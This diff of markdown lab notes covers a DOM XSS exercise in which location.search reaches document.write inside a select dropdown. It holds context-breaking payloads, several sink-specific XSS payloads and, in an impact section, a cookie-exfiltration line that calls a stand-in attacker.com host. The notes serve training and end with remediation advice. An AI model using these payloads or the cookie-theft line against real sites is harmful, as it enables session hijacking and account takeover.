@@ -1339,7 +1339,7 @@ DOM XSS
 
 ---
 
-# 🐞 Lab-4: DOM-Based XSS via document.write + location.search in Restricted Dropdown Context
+# Lab-4 🐞 DOM-Based XSS via document.write + location.search inside <select>
 
 ---
 
@@ -1347,190 +1347,198 @@ DOM XSS
 
 DOM-Based Cross-Site Scripting (DOM XSS) occurs when:
 
-- User-controlled input is processed entirely in the browser  
-- JavaScript reads this input from URL-based sources  
-- The data is written into the DOM using unsafe sinks  
+- User input is processed **entirely in the browser**
+- JavaScript reads attacker-controlled data
+- Writes it into the DOM using **unsafe sinks**
 
-In this lab:
+Key characteristics:
 
-- Server response is **safe** ❌  
+- Server response is **clean** ❌  
 - Payload is **not stored** ❌  
-- Execution happens in **client-side JavaScript** ✅  
+- Execution happens via **client-side DOM manipulation** ✅  
 
-Key idea:
+This lab demonstrates a **restricted HTML context bypass** using:
 
-→ **The browser itself becomes the vulnerable component**
+→ document.write  
+→ location.search  
+→ Injection inside select/option  
 
 ---
 
 ## 🔹 What Is This Topic?
 
-DOM XSS follows this flow:
+DOM XSS happens when:
 
 User input  
-→ JavaScript reads input  
+→ JavaScript  
 → Unsafe DOM insertion  
 → Execution  
 
-Critical concept:
+Core idea:
 
-**If attacker-controlled data reaches a dangerous DOM sink without sanitization, execution becomes possible.**
+**If attacker-controlled data reaches a dangerous sink without sanitization, execution becomes possible.**
 
-Unlike other XSS types:
+---
 
-- No server-side reflection  
-- No database persistence  
-- Entire attack happens inside browser runtime  
+### 🔥 Source → Sink Mapping
+
+**Source:**
+
+- location.search  
+
+**Sink:**
+
+- document.write  
+
+---
+
+### ⚠ Why This Matters
+
+- No payload in server response  
+- Not visible in View Source  
+- Only visible in **live DOM**  
+
+→ Requires **JavaScript tracing mindset**
 
 ---
 
 ## 🔹 Lab Walkthrough
 
+---
+
 ### Step 1 — Open Lab
 
-Application:
-
-- Stock checker  
-- Dropdown menu for store selection  
-- Locations: London, Paris, Milan  
+- Stock checker interface  
+- Dropdown with store locations  
 
 ---
 
-### Step 2 — Observe Normal Behavior
+### Step 2 — Observe Behavior
 
-- Selecting a store updates stock dynamically  
-- No visible user input in URL  
+- No visible input field  
+- URL appears clean  
 
-→ Appears safe initially  
+→ Looks safe ❌  
 
 ---
 
-### Step 3 — Investigate JavaScript
+### Step 3 — Analyze JavaScript
 
-Using DevTools:
-
-Search for:
+Search:
 
 location.search  
 
-Discovery:
+You discover:
 
-- Application reads parameter: **storeId**  
+storeId parameter is used  
 
 ---
 
-### Step 4 — Inject Parameter Manually
-
-Append:
+### Step 4 — Inject Input
 
 ?storeId=London  
 
-Result:
+Application works normally  
 
-- Application continues functioning  
-
-→ Confirms JavaScript is processing user input  
+→ Confirms input is processed client-side  
 
 ---
 
-### Step 5 — Test Reflection in DOM
-
-Inject:
-
-XSS123  
-
-Inspect **live DOM** (NOT View Source):
-
-option element shows:
-
-selected XSS123  
-
-→ Input is dynamically inserted  
-
----
-
-## 🔹 Evidence / Screenshot (SS)
-
-### Screenshot-01
-![DOM reflection in option](../images/dom-xss-input-reflection.png)
-
-### Screenshot-02
-![DOM exploitation in option](../images/dom-xss-input-exploitation.png)
-
----
-
-### Step 6 — Identify Context
-
-Injection occurs inside:
-
-option element within a dropdown structure  
-
-Context:
-
-- Nested inside a restricted UI element  
-- Browser limits executable content here  
-
----
-
-### ⚠ Critical Observation
-
-This is a **restricted HTML context**
-
-- Script tags will not execute  
-- Many elements are ignored  
-- Event handlers are constrained  
-
-→ Standard payloads FAIL  
-
----
-
-### Step 7 — Craft Payload
-
-Goal:
-
-→ Break out of restricted structure  
-→ Inject executable HTML  
+### Step 5 — Test Reflection
 
 Payload:
 
-"></end><img%20src=1%20onerror=alert(1)>  
+XSS123  
 
-Better practical payload:
+Inspect **Elements panel**
+
+Result:
+
+<option selected>XSS123</option>  
+
+---
+
+### 🔥 Context Identified
+
+- Inside option tag  
+- Inside select tag  
+
+---
+
+### ⚠ Restricted Context
+
+- select blocks script execution  
+- Many tags are ignored  
+
+---
+
+### ❌ Why Normal Payload Fails
+
+Payload:
+
+<script>alert(1)</script>  
+
+Fails because:
+
+- Browser restricts execution inside select  
+- Structure is not broken  
+
+---
+
+### Step 6 — Break Structure
+
+Goal:
+
+→ Close option  
+→ Close select  
+→ Inject new HTML  
+
+---
+
+### Step 7 — Exploit Payload
+
+Payload:
 
 "></select><img src=1 onerror=alert(1)>  
 
 ---
 
-### Step 8 — Understand DOM Transformation
+### Step 8 — DOM Transformation
 
-Before injection:
+Before:
 
-option selected London  
+<option selected>London</option>  
 
-After injection:
+---
 
-option selected "  
+After:
 
-structure closed  
-
-img tag injected with onerror handler  
+<option selected>"></option>  
+</select>  
+<img src=1 onerror=alert(1)>  
 
 ---
 
 ### Step 9 — Execution
 
 - Image fails to load  
-- onerror triggers  
+- onerror fires  
 - JavaScript executes  
 
-→ Alert appears  
-→ Lab solved  
+→ Alert triggered  
+→ Lab solved ✅  
 
 ---
 
 ## 🔹 Evidence / Screenshot (SS)
 
-![Payload execution DOM XSS](../images/dom-xss-payload-execution.png)
+![DOM injection inside select](../images/dom-xss-input-reflection.png)
+
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+![Payload execution via onerror](../images/dom-xss-input-exploitation.png)
 
 ---
 
@@ -1538,54 +1546,45 @@ img tag injected with onerror handler
 
 ---
 
-### 🟢 Dropdown Injection Pattern
+### 🟢 Dropdown Injection
 
-Pattern:
+Example:
 
-document.write(option + userInput + option end)  
+document.write('<option>' + userInput + '</option>')  
+
+---
 
 Payload:
 
 "></select><svg onload=alert(1)>  
 
-Why it works:
-
-→ Escape restricted structure  
-→ Inject executable element  
-
 ---
 
 ### 🟢 document.write Abuse
 
-Pattern:
+Example:
 
 document.write(userInput)  
+
+---
 
 Payload:
 
 <script>alert(1)</script>  
 
-Impact:
-
-→ Direct HTML parsing → execution  
-
 ---
 
 ### 🟢 innerHTML Injection
 
-Pattern:
+Example:
 
 element.innerHTML = userInput  
+
+---
 
 Payload:
 
 <img src=x onerror=alert(1)>  
-
-Common targets:
-
-- Dashboards  
-- Search results  
-- Dynamic widgets  
 
 ---
 
@@ -1596,6 +1595,8 @@ Examples:
 eval(userInput)  
 setTimeout(userInput)  
 Function(userInput)  
+
+---
 
 Payload:
 
@@ -1609,19 +1610,17 @@ Source:
 
 location.hash  
 
+---
+
 Payload:
 
 #<img src=x onerror=alert(1)>  
 
 ---
 
-### 🟢 Hidden Parameter Processing
+### 🟢 Hidden Parameters
 
-Pattern:
-
-JavaScript reads hidden parameters  
-
-Payload:
+Attack:
 
 ?param=payload  
 
@@ -1629,13 +1628,13 @@ Payload:
 
 ## 🎯 High-Value Targets
 
-- Dropdowns  
-- Filters  
+- Dropdown generators  
 - Search parameters  
-- Client-side routing  
-- Admin dashboards  
+- Filters  
+- SPA routing  
+- Admin panels  
 - Analytics scripts  
-- Hidden JavaScript parameters  
+- Hidden JS parameters  
 
 ---
 
@@ -1645,39 +1644,36 @@ Payload:
 
 ### 🔥 Session Hijacking
 
-fetch("https://attacker.com?c="+document.cookie)  
+fetch("https://attacker.com?c=" + document.cookie)  
 
 ---
 
 ### 🔥 Account Takeover
 
-Steal:
-
-- Cookies  
-- JWT tokens  
-- CSRF tokens  
+- Steal session cookies  
+- Extract tokens  
+- Impersonate user  
 
 ---
 
 ### 🔥 Admin Compromise
 
-Send malicious link → admin executes payload  
+- Send malicious link  
+- Trigger execution in admin browser  
 
 ---
 
 ### 🔥 Data Exfiltration
 
-Extract:
-
-- DOM data  
-- API responses  
-- Sensitive user information  
+- Read DOM  
+- Extract API responses  
+- Leak sensitive data  
 
 ---
 
 ### 🔥 CSRF Bypass
 
-Perform authenticated actions using injected JavaScript  
+- Perform authenticated actions via JS  
 
 ---
 
@@ -1685,7 +1681,7 @@ Perform authenticated actions using injected JavaScript
 
 ---
 
-### Step 1 — Identify Sources
+### Step 1 — Find Sources
 
 - location.search  
 - location.hash  
@@ -1700,13 +1696,13 @@ XSS123TEST
 
 ---
 
-### Step 3 — Inspect Live DOM
+### Step 3 — Inspect DOM
 
-Use DevTools  
+Use DevTools (Elements tab)  
 
 ---
 
-### Step 4 — Identify Sinks
+### Step 4 — Find Sinks
 
 - document.write  
 - innerHTML  
@@ -1718,7 +1714,7 @@ Use DevTools
 
 - HTML  
 - Attribute  
-- Restricted structure  
+- Restricted tags  
 
 ---
 
@@ -1726,44 +1722,61 @@ Use DevTools
 
 Break structure  
 → Escape context  
-→ Inject executable code  
+→ Inject execution  
 
 ---
 
-## 🛡 Remediation
+## Remediation
 
-- Avoid document.write()  
-- Avoid innerHTML with untrusted input  
+- Avoid document.write  
+- Avoid innerHTML with user input  
 - Use textContent  
-- Sanitize inputs properly  
-- Use secure frontend frameworks  
+- Sanitize input  
+- Use frameworks safely  
 - Implement CSP  
 
 ---
 
 ## 💡 Notes / Mindset
 
-Key insight:
+- DOM XSS = **data flow vulnerability**  
+- Not visible in response  
+- Requires JS analysis  
 
-→ **Execution happens after DOM manipulation, not from server response**
+---
 
-Always think:
+### 🔥 Think Like a Bug Hunter
 
-→ Where does input enter JavaScript?  
+→ Where is input coming from?  
 → Where is it written?  
-→ What context is it in?  
-→ Can I break the structure?  
+→ What context?  
+→ Can I break it?  
 
 ---
 
 ## 🧠 Mental Model
 
 Input  
-→ JavaScript source  
-→ DOM sink  
-→ Context  
-→ Break  
-→ Execute  
-→ Impact  
+→ location.search  
+→ document.write  
+→ select context  
+→ break structure  
+→ inject HTML  
+→ execute  
+→ impact  
+
+---
+
+## 💡 Key Difference
+
+- Reflected XSS → server-side reflection  
+- Stored XSS → persistent  
+- DOM XSS → browser execution  
+
+---
+
+## 💡 One-Line Memory Hook
+
+Break the structure → not the payload.
 
 ---
